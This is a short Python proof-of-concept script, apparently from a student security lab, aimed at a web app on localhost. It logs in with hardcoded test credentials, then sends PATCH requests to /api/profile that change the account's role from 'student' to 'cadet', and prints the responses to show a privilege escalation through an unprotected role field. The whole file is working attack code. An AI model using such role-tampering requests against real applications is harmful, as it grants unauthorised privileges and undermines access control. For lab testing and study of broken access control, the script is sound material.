#script that patches a role, preferably with get before and after, highlighting it,
#then accessing the page with elevated priviliges.

import sys
import requests


GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

# step 1 - login and get session cookie

identity = "jdoe@student.42.tech"
password = "abc123"
auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": identity, "password": password},
    allow_redirects=False
)
 
cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print(f"{GREEN}Logged in successfully with " + identity + " and " + password )

print(f"{RESET}__________")
print(f"{CYAN}BEFORE PATCHING{RESET}")
targeturl = "http://localhost:4942/api/profile"

response = requests.patch(
        targeturl,
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
		json={"role": "student"},
        allow_redirects=False
    )
print("__________")
print("response text of patch profile:\n")
print(response.text)
print(response.status_code)
print("__________")

keyword = "role"
index = response.text.find(keyword)

# Check if found to avoid slicing from -1
if index != -1:
    result = response.text[index:]
    print(f"{RED}" +result)
else:
    print("")

print(f"{RESET}__________")
print(f"{CYAN}AFTER PATCHING{RESET}")
targeturl = "http://localhost:4942/api/profile"

response = requests.patch(
        targeturl,
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
		json={"role": "cadet"},
        allow_redirects=False
    )
print("__________")
print("response text of patch profile:\n")
print(response.text)
print(response.status_code)
print("__________")

print("___________") 
keyword = "role"
index = response.text.find(keyword)

# Check if found to avoid slicing from -1
if index != -1:
    result = response.text[index:]
    print(f"{GREEN}"+ result)
else:
    print("")